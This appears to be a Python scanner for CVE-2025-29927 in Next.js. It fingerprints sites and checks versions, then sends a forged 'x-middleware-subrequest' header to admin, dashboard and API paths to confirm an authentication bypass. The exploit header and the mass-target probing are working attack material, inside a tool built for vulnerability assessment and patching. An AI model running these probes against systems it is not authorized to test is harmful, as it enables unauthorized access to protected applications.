#!/usr/bin/env python3
"""
Next.js CVE-2025-29927 Middleware Authentication Bypass Scanner
===============================================================
Scans for Next.js applications and tests whether they are vulnerable to the
middleware authentication bypass (CVE-2025-29927, CVSS 9.1 Critical).

CVE-2025-29927 details:
  - Affects Next.js < 14.2.25 and < 15.2.3
  - An internal header `x-middleware-subrequest` is used by Next.js to track
    recursive middleware invocations and prevent infinite loops. When this
    header is present and its value exceeds the recursion depth limit, the
    middleware is skipped entirely without executing.
  - Attackers can forge this header with a value of:
      middleware:middleware:middleware:middleware:middleware
    (the middleware name repeated 5 times, colon-separated) to bypass ALL
    middleware logic on any route — including authentication checks,
    authorization gates, redirects, rate limiting, and bot protection.
  - Because middleware runs before the request reaches the application,
    bypassing it means that even routes protected by session checks,
    JWT validation, or IP allowlists can be accessed without credentials.
  - Fixed in Next.js 14.2.25 and 15.2.3 (March 2025)
  - CISA added to KEV catalog; widely exploited in the wild

Usage:
  # Scan a single target
  python nextjs_middleware_bypass.py --target https://app.example.com

  # Scan a list of targets
  python nextjs_middleware_bypass.py --list targets.txt --output findings.json

  # Safe mode — fingerprint and version-check only, no bypass probes
  python nextjs_middleware_bypass.py --target https://app.example.com --safe

  # Tune concurrency and disable TLS verification
  python nextjs_middleware_bypass.py --list hosts.txt --concurrency 50 --no-verify

  # Save JSON results
  python nextjs_middleware_bypass.py --list hosts.txt --output results.json

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
  - https://nextjs.org/blog/cve-2025-29927
  - https://github.com/advisories/GHSA-f82v-jwr5-mffw
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  - https://github.com/vercel/next.js/releases/tag/v14.2.25
  - https://github.com/vercel/next.js/releases/tag/v15.2.3
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from urllib.parse import urlparse, urljoin

import httpx

# ── ANSI color codes ──────────────────────────────────────────────────────────

RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"   # CRITICAL
YELLOW  = "\033[93m"   # HIGH / WARNING
GREEN   = "\033[92m"   # INFO / OK
CYAN    = "\033[96m"   # banner / headers
DIM     = "\033[2m"


def color(text: str, code: str) -> str:
    return f"{code}{text}{RESET}"


def severity_color(sev: str) -> str:
    mapping = {
        "CRITICAL": RED,
        "HIGH":     YELLOW,
        "MEDIUM":   YELLOW,
        "LOW":      GREEN,
        "INFO":     GREEN,
    }
    return color(sev, mapping.get(sev, RESET))


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME    = "nextjs-middleware-bypass-scanner"
CVE_ID       = "CVE-2025-29927"
CVSS_SCORE   = "9.1 (Critical)"

# The bypass header and its magic value
BYPASS_HEADER = "x-middleware-subrequest"
BYPASS_VALUE  = "middleware:middleware:middleware:middleware:middleware"

# Versions where the fix was shipped
FIXED_VERSIONS = {
    14: (14, 2, 25),
    15: (15, 2, 3),
}

REQUEST_TIMEOUT  = 10
SEMAPHORE_LIMIT  = 30
USER_AGENT       = f"Mozilla/5.0 SecurityResearch/{TOOL_NAME}"

# ── Next.js fingerprint markers ───────────────────────────────────────────────

# HTTP response headers that indicate Next.js
NEXTJS_HEADERS = [
    "x-powered-by",   # often "Next.js"
    "x-nextjs-cache",
    "x-next-cache",
    "x-vercel-cache",
]

# HTML body markers
NEXTJS_HTML_MARKERS = [
    "__NEXT_DATA__",
    "_next/static/",
    "_next/image",
    "__next_router_basepath",
    "next/dist/",
    "__NEXT_F",               # App Router flight data
    "self.__next_f",
]

# Paths to probe during fingerprinting
DETECTION_PATHS = [
    "/",
    "/_next/static/",         # Always exists on Next.js apps
    "/api/health",
    "/api/status",
    "/favicon.ico",
    "/robots.txt",
]

# Paths that are commonly protected by middleware (used for bypass probing)
PROTECTED_PATH_CANDIDATES = [
    "/dashboard",
    "/admin",
    "/admin/",
    "/profile",
    "/account",
    "/settings",
    "/api/admin",
    "/api/user",
    "/api/me",
    "/api/users",
    "/api/dashboard",
    "/private",
    "/members",
    "/portal",
    "/app",
    "/secure",
    "/internal",
]

# Version extraction patterns (headers + HTML)
VERSION_PATTERNS = [
    # HTML: next.config, __NEXT_DATA__, or similar embeds
    r'"version"\s*:\s*"(1[0-9]\.[0-9]+\.[0-9]+)"',
    r'next[/@]([0-9]{2}\.[0-9]+\.[0-9]+)',
    r'"nextVersion"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
    r'next\.js[/ ]v?([0-9]+\.[0-9]+\.[0-9]+)',
    # Build manifests or chunk files
    r'"buildId"\s*.*?"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
    # x-powered-by header value e.g. "Next.js 14.2.20"
    r'Next\.js\s+([0-9]+\.[0-9]+\.[0-9]+)',
]

# Static chunk paths that may expose the Next.js version
VERSION_PROBE_PATHS = [
    "/_next/static/chunks/main.js",
    "/_next/static/chunks/webpack.js",
    "/_next/static/chunks/framework.js",
    "/_next/static/chunks/polyfills.js",
    "/package.json",                       # sometimes public
    "/_next/static/development/pages/_app.js",
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    """Ensure URL has a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def parse_version(text: str) -> tuple[int, ...] | None:
    """Extract the first plausible Next.js version string from arbitrary text."""
    for pattern in VERSION_PATTERNS:
        m = re.search(pattern, text, re.IGNORECASE)
        if m:
            try:
                parts = tuple(int(x) for x in m.group(1).split("."))
                # Sanity-check: Next.js major versions are 9–99
                if 9 <= parts[0] <= 99:
                    return parts
            except (ValueError, IndexError):
                pass
    return None


def is_vulnerable(version: tuple[int, ...] | None) -> bool | None:
    """
    Return True  — confirmed vulnerable
           False — confirmed patched
           None  — version unknown, cannot determine
    """
    if version is None:
        return None
    major = version[0]
    fixed = FIXED_VERSIONS.get(major)
    if fixed is None:
        # Major version outside 14/15 — older branches (≤13) have no fix
        # and are considered vulnerable; >= 16 assumed safe.
        if major <= 13:
            return True
        return False
    return version < fixed


def fmt_version(v: tuple[int, ...] | None) -> str:
    return ".".join(str(x) for x in v) if v else "unknown"


def utcnow_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _responses_differ_meaningfully(r_normal: httpx.Response, r_bypass: httpx.Response) -> bool:
    """
    Return True if the bypass response looks materially different from the
    baseline (normal) response in a way that suggests middleware was skipped.

    Heuristics:
      - Status codes differ (e.g. 302 → 200, 401 → 200, 403 → 200)
      - Normal response had a redirect Location header, bypass didn't
      - Normal response was short/empty (redirect body), bypass returned content
      - Significant body length difference with baseline being much smaller
    """
    normal_status = r_normal.status_code
    bypass_status = r_bypass.status_code

    # A redirect or auth error becoming a 200 is the smoking gun
    if normal_status in (301, 302, 307, 308, 401, 403) and bypass_status == 200:
        return True

    # Any status change from a redirect to non-redirect
    if normal_status in (301, 302, 307, 308) and bypass_status not in (301, 302, 307, 308):
        return True

    # Auth/forbidden going to anything other than the same code
    if normal_status in (401, 403) and bypass_status not in (401, 403):
        return True

    # Body length: baseline is a short redirect page (<500 bytes) but bypass
    # returned something substantial (>2000 bytes)
    normal_len = len(r_normal.content)
    bypass_len = len(r_bypass.content)
    if normal_len < 500 and bypass_len > 2000:
        return True

    # Location header present in normal but absent in bypass
    normal_location = r_normal.headers.get("location", "")
    bypass_location = r_bypass.headers.get("location", "")
    if normal_location and not bypass_location:
        return True

    return False


# ── Fingerprinting ────────────────────────────────────────────────────────────

async def fingerprint_nextjs(
    client: httpx.AsyncClient,
    base_url: str,
    semaphore: asyncio.Semaphore,
) -> dict | None:
    """
    Probe a URL to determine whether it is a Next.js application.

    Checks:
      1. `x-powered-by: Next.js` response header
      2. Next.js-specific response headers (x-nextjs-cache, etc.)
      3. __NEXT_DATA__ / _next/static/ markers in HTML bodies
      4. /_next/static/ path returning HTTP 200 or 404 (either confirms Next.js)
      5. Version extraction from headers, HTML, or chunk JS files

    Returns None if not identified as Next.js.
    Returns a dict with detection details and extracted version on success.
    """
    async with semaphore:
        version: tuple[int, ...] | None = None
        confidence_signals: list[str] = []
        headers_seen: dict[str, str] = {}

        for path in DETECTION_PATHS:
            url = base_url + path
            try:
                r = await client.get(
                    url,
                    timeout=REQUEST_TIMEOUT,
                    follow_redirects=True,
                    headers={"User-Agent": USER_AGENT},
                )
            except Exception:
                continue

            body = r.text

            # --- Header-based detection ---
            for hdr in NEXTJS_HEADERS:
                val = r.headers.get(hdr, "")
                if val:
                    headers_seen[hdr] = val
                    if "next" in val.lower():
                        confidence_signals.append(f"header:{hdr}={val}")

            # x-powered-by: Next.js is definitive
            powered_by = r.headers.get("x-powered-by", "")
            if "next.js" in powered_by.lower():
                confidence_signals.append("x-powered-by:Next.js")
                v = parse_version(powered_by)
                if v:
                    version = v

            # --- HTML body markers ---
            for marker in NEXTJS_HTML_MARKERS:
                if marker in body:
                    confidence_signals.append(f"html:{marker}")

            # --- Version from body ---
            if version is None:
                v = parse_version(body)
                if v:
                    version = v

            # Stop early once we have high confidence
            if len(confidence_signals) >= 2:
                break

        # If no signals from main paths, probe /_next/static/ specifically
        if not confidence_signals:
            try:
                r = await client.get(
                    base_url + "/_next/static/",
                    timeout=REQUEST_TIMEOUT,
                    follow_redirects=False,
                    headers={"User-Agent": USER_AGENT},
                )
                # 200, 403, or 404 from /_next/ all indicate Next.js routing
                if r.status_code in (200, 403, 404):
                    # Only count as a signal if the response looks like Next.js served it
                    if any(m in r.text for m in NEXTJS_HTML_MARKERS):
                        confidence_signals.append("_next/static/ path exists with markers")
            except Exception:
                pass

        if not confidence_signals:
            return None

        # --- Try to extract version from chunk files if still unknown ---
        if version is None:
            for vpath in VERSION_PROBE_PATHS:
                try:
                    r = await client.get(
                        base_url + vpath,
                        timeout=REQUEST_TIMEOUT,
                        follow_redirects=True,
                        headers={"User-Agent": USER_AGENT},
                    )
                    if r.status_code == 200:
                        v = parse_version(r.text)
                        if v:
                            version = v
                            confidence_signals.append(f"version extracted from {vpath}")
                            break
                except Exception:
                    continue

        return {
            "url":               base_url,
            "nextjs_detected":   True,
            "confidence_signals": list(dict.fromkeys(confidence_signals)),  # deduplicate
            "version":           version,
            "version_str":       fmt_version(version),
            "headers_seen":      headers_seen,
        }


# ── Bypass probing ────────────────────────────────────────────────────────────

async def probe_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    semaphore: asyncio.Semaphore,
) -> dict:
    """
    Attempt the CVE-2025-29927 middleware bypass on commonly-protected routes.

    For each candidate protected path:
      1. Fetch without the bypass header (baseline)
      2. Fetch WITH `x-middleware-subrequest: middleware:middleware:...`
      3. Compare responses

    A bypass is indicated when:
      - The baseline returns 301/302/307/308 (redirect to login) or 401/403
      - The bypass request returns 200 or otherwise differs meaningfully

    Returns a result dict describing the outcome.
    """
    async with semaphore:
        bypass_confirmed  = False
        bypass_candidates = []
        probed_paths      = []

        base_headers = {"User-Agent": USER_AGENT}
        bypass_headers = {
            "User-Agent":         USER_AGENT,
            BYPASS_HEADER:        BYPASS_VALUE,
        }

        for path in PROTECTED_PATH_CANDIDATES:
            url = base_url + path
            try:
                # Baseline request (no bypass header)
                r_normal = await client.get(
                    url,
                    timeout=REQUEST_TIMEOUT,
                    follow_redirects=False,
                    headers=base_headers,
                )

                # Only probe paths where the server actually responds (not connection errors)
                probed_paths.append({
                    "path":          path,
                    "normal_status": r_normal.status_code,
                })

                # If the baseline is a redirect or auth error, it's a good candidate
                if r_normal.status_code in (200, 301, 302, 307, 308, 401, 403):
                    # Bypass request
                    r_bypass = await client.get(
                        url,
                        timeout=REQUEST_TIMEOUT,
                        follow_redirects=False,
                        headers=bypass_headers,
                    )

                    differs = _responses_differ_meaningfully(r_normal, r_bypass)

                    probe_result = {
                        "path":           path,
                        "url":            url,
                        "normal_status":  r_normal.status_code,
                        "bypass_status":  r_bypass.status_code,
                        "differs":        differs,
                        "normal_location": r_normal.headers.get("location", ""),
                        "bypass_location": r_bypass.headers.get("location", ""),
                        "normal_body_len": len(r_normal.content),
                        "bypass_body_len": len(r_bypass.content),
                    }

                    if differs:
                        bypass_confirmed = True
                        probe_result["confirmed"] = True
                        bypass_candidates.append(probe_result)
                    else:
                        probe_result["confirmed"] = False
                        bypass_candidates.append(probe_result)

            except httpx.TimeoutException:
                probed_paths.append({"path": path, "normal_status": "timeout"})
                continue
            except Exception:
                continue

        # Summarise most interesting result
        confirmed_paths = [p for p in bypass_candidates if p.get("confirmed")]

        return {
            "bypass_confirmed":   bypass_confirmed,
            "bypass_header":      BYPASS_HEADER,
            "bypass_value":       BYPASS_VALUE,
            "probed_paths":       probed_paths,
            "confirmed_bypasses": confirmed_paths,
            "all_candidates":     bypass_candidates,
        }


# ── Full target scan ──────────────────────────────────────────────────────────

async def scan_target(
    client:    httpx.AsyncClient,
    url:       str,
    semaphore: asyncio.Semaphore,
    safe_mode: bool = False,
) -> dict | None:
    """
    End-to-end scan of a single target URL for CVE-2025-29927.

    Steps:
      1. Fingerprint to confirm Next.js and extract version
      2. Version-based vulnerability assessment
      3. (Unless --safe) Active bypass probe against protected-looking paths
      4. Aggregate findings and assign overall risk rating
    """
    base_url = normalize_url(url)

    # ── Step 1: Fingerprint ──────────────────────────────────────────────────
    fp = await fingerprint_nextjs(client, base_url, semaphore)
    if not fp:
        return None   # Not a Next.js app

    version     = fp["version"]
    version_str = fp["version_str"]
    vulnerable  = is_vulnerable(version)

    result: dict = {
        "url":                base_url,
        "timestamp":          utcnow_iso(),
        "cve":                CVE_ID,
        "nextjs_detected":    True,
        "version":            version_str,
        "confidence_signals": fp["confidence_signals"],
        "risk":               "UNKNOWN",
        "findings":           [],
        "bypass_probe":       None,
    }

    # ── Step 2: Version assessment ───────────────────────────────────────────
    if vulnerable is True:
        result["findings"].append({
            "type":     "vulnerable_version",
            "severity": "CRITICAL",
            "detail":   (
                f"Next.js {version_str} is below the patched version "
                f"({fmt_version(FIXED_VERSIONS.get(version[0] if version else 0))}). "
                f"Upgrade immediately."
            ),
        })
        result["risk"] = "CRITICAL"

    elif vulnerable is False:
        result["findings"].append({
            "type":     "patched_version",
            "severity": "INFO",
            "detail":   f"Next.js {version_str} is patched against CVE-2025-29927.",
        })
        result["risk"] = "LOW"

    else:
        result["findings"].append({
            "type":     "version_unknown",
            "severity": "HIGH",
            "detail":   (
                "Could not determine Next.js version. "
                "Manual version verification required — assume vulnerable until confirmed patched."
            ),
        })
        result["risk"] = "HIGH"

    # ── Step 3: Active bypass probe ──────────────────────────────────────────
    if safe_mode:
        result["findings"].append({
            "type":     "safe_mode",
            "severity": "INFO",
            "detail":   "Active bypass probe skipped (--safe mode).",
        })
    else:
        bypass = await probe_bypass(client, base_url, semaphore)
        result["bypass_probe"] = bypass

        if bypass["bypass_confirmed"]:
            confirmed = bypass["confirmed_bypasses"]
            paths_str = ", ".join(p["path"] for p in confirmed)
            example   = confirmed[0]
            result["findings"].append({
                "type":          "bypass_confirmed",
                "severity":      "CRITICAL",
                "detail":        (
                    f"Middleware bypass CONFIRMED on {len(confirmed)} path(s): {paths_str}. "
                    f"Example: {example['path']} — baseline {example['normal_status']} "
                    f"→ bypass {example['bypass_status']}."
                ),
                "bypass_header": BYPASS_HEADER,
                "bypass_value":  BYPASS_VALUE,
                "paths":         [p["path"] for p in confirmed],
            })
            result["risk"] = "CRITICAL"

        elif bypass["all_candidates"]:
            result["findings"].append({
                "type":     "bypass_inconclusive",
                "severity": "MEDIUM",
                "detail":   (
                    f"Probed {len(bypass['probed_paths'])} path(s) — no clear bypass signal detected. "
                    "The app may not have accessible protected routes, or middleware may not guard "
                    "the tested paths. Manual verification recommended."
                ),
            })
            # Don't downgrade from CRITICAL/HIGH if version already flagged it
            if result["risk"] == "LOW":
                result["risk"] = "LOW"

        else:
            result["findings"].append({
                "type":     "bypass_no_candidates",
                "severity": "INFO",
                "detail":   "No protected-looking paths responded during bypass probe.",
            })

    return result


# ── Output helpers ────────────────────────────────────────────────────────────

BANNER = f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════╗
║       Next.js Middleware Auth Bypass Scanner                     ║
║       {CVE_ID} — CVSS {CVSS_SCORE}                         ║
║       Affects: Next.js < 14.2.25 and < 15.2.3                   ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
"""


def print_banner():
    print(BANNER)


def print_result(result: dict):
    """Pretty-print a single scan result to stdout."""
    risk    = result.get("risk", "UNKNOWN")
    version = result.get("version", "unknown")
    url     = result.get("url", "")

    print(f"\n{'─'*68}")
    print(f"  {color('TARGET', BOLD)}   : {url}")
    print(f"  {color('VERSION', BOLD)}  : {version}")
    print(f"  {color('RISK', BOLD)}     : {severity_color(risk)}")

    for finding in result.get("findings", []):
        sev    = finding.get("severity", "INFO")
        detail = finding.get("detail", "")
        sev_str = severity_color(sev)
        print(f"  [{sev_str}] {detail}")

        # Extra detail for confirmed bypasses
        if finding.get("type") == "bypass_confirmed":
            bp = result.get("bypass_probe", {})
            for p in bp.get("confirmed_bypasses", []):
                print(
                    f"    {DIM}  {p['path']}: "
                    f"normal={p['normal_status']} → bypass={p['bypass_status']}"
                    f"  (body: {p['normal_body_len']}B → {p['bypass_body_len']}B){RESET}"
                )

    if risk == "CRITICAL":
        print(f"\n  {RED}{BOLD}>>> VULNERABLE TO {CVE_ID} — PATCH IMMEDIATELY <<<{RESET}")
        print(f"  {DIM}Upgrade to Next.js 14.2.25 or 15.2.3{RESET}")

    print(f"{'─'*68}")


def print_summary(targets: list[str], findings: list[dict]):
    """Print end-of-scan summary table."""
    critical = [r for r in findings if r.get("risk") == "CRITICAL"]
    high     = [r for r in findings if r.get("risk") == "HIGH"]
    medium   = [r for r in findings if r.get("risk") == "MEDIUM"]
    low      = [r for r in findings if r.get("risk") == "LOW"]

    print(f"\n{'═'*68}")
    print(f"{BOLD}SCAN COMPLETE — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M')} UTC{RESET}")
    print(f"{'═'*68}")
    print(f"  Targets scanned   : {len(targets)}")
    print(f"  Next.js detected  : {len(findings)}")
    print(f"  {RED}CRITICAL{RESET}           : {len(critical)}")
    print(f"  {YELLOW}HIGH{RESET}              : {len(high)}")
    print(f"  {YELLOW}MEDIUM{RESET}            : {len(medium)}")
    print(f"  {GREEN}LOW (patched){RESET}      : {len(low)}")
    print(f"{'═'*68}")

    if critical:
        print(f"\n{RED}{BOLD}CRITICAL — Patch immediately:{RESET}")
        for r in critical:
            ver = r.get("version", "unknown")
            print(f"  {r['url']}  {DIM}(v{ver}){RESET}")

    if high:
        print(f"\n{YELLOW}{BOLD}HIGH — Version unknown, assume vulnerable:{RESET}")
        for r in high:
            print(f"  {r['url']}")


# ── Main ──────────────────────────────────────────────────────────────────────

async def main(args):
    targets: list[str] = []

    if args.target:
        targets.append(args.target)

    if args.list:
        try:
            with open(args.list) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except FileNotFoundError:
            print(f"{RED}[!] File not found: {args.list}{RESET}", file=sys.stderr)
            sys.exit(1)

    if not targets:
        print(f"{RED}[!] No targets specified. Use --target or --list.{RESET}", file=sys.stderr)
        sys.exit(1)

    # Deduplicate while preserving order
    targets = list(dict.fromkeys(targets))

    print_banner()
    print(f"{GREEN}[*]{RESET} Scanning {BOLD}{len(targets)}{RESET} target(s) for {CVE_ID}")
    if args.safe:
        print(f"{GREEN}[*]{RESET} Safe mode: fingerprint + version check only, no bypass probes")
    print(f"{GREEN}[*]{RESET} Concurrency: {args.concurrency}  |  TLS verify: {not args.no_verify}")
    print()

    global SEMAPHORE_LIMIT
    SEMAPHORE_LIMIT = args.concurrency
    semaphore       = asyncio.Semaphore(SEMAPHORE_LIMIT)
    findings: list[dict] = []

    ssl_context = False if args.no_verify else True

    async with httpx.AsyncClient(verify=ssl_context, timeout=REQUEST_TIMEOUT) as client:
        tasks    = [scan_target(client, t, semaphore, args.safe) for t in targets]
        completed = 0

        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1

            # Progress ticker (overwrites itself on multi-target scans)
            if len(targets) > 5:
                nextjs_count = len(findings)
                print(
                    f"  {DIM}Progress: {completed}/{len(targets)} "
                    f"| Next.js found: {nextjs_count}{RESET}",
                    end="\r",
                )

            if result is not None:
                findings.append(result)
                print_result(result)

    print()  # clear progress line
    print_summary(targets, findings)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(
                {
                    "scan_meta": {
                        "tool":       TOOL_NAME,
                        "cve":        CVE_ID,
                        "cvss":       CVSS_SCORE,
                        "timestamp":  utcnow_iso(),
                        "targets":    len(targets),
                        "safe_mode":  args.safe,
                    },
                    "findings": findings,
                },
                f,
                indent=2,
            )
        print(f"\n{GREEN}[*]{RESET} Results saved to {BOLD}{args.output}{RESET}")

    return findings


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"Next.js {CVE_ID} Middleware Authentication Bypass Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  python nextjs_middleware_bypass.py --target https://app.example.com
  python nextjs_middleware_bypass.py --list targets.txt --output findings.json
  python nextjs_middleware_bypass.py --target https://app.example.com --safe
  python nextjs_middleware_bypass.py --list hosts.txt --concurrency 50 --no-verify --output out.json

Bypass mechanism:
  Sends `{BYPASS_HEADER}: {BYPASS_VALUE}`
  This causes Next.js to skip middleware execution entirely, bypassing
  authentication, authorization, redirects, and any other middleware logic.

Fix:
  Upgrade to Next.js 14.2.25 (for the 14.x branch) or 15.2.3 (for 15.x).
        """,
    )
    parser.add_argument(
        "--target", metavar="URL",
        help="Single target URL to scan (e.g. https://app.example.com)",
    )
    parser.add_argument(
        "--list", metavar="FILE",
        help="Path to a file containing one target URL per line",
    )
    parser.add_argument(
        "--output", metavar="FILE",
        help="Write JSON results to this file",
    )
    parser.add_argument(
        "--safe", action="store_true",
        help=(
            "Safe mode: fingerprint and version-check only. "
            "Do NOT send the bypass header or probe protected routes."
        ),
    )
    parser.add_argument(
        "--concurrency", type=int, default=30, metavar="N",
        help="Maximum number of concurrent requests (default: 30)",
    )
    parser.add_argument(
        "--no-verify", action="store_true",
        help="Disable TLS certificate verification (useful for self-signed certs)",
    )

    parsed = parser.parse_args()
    asyncio.run(main(parsed))
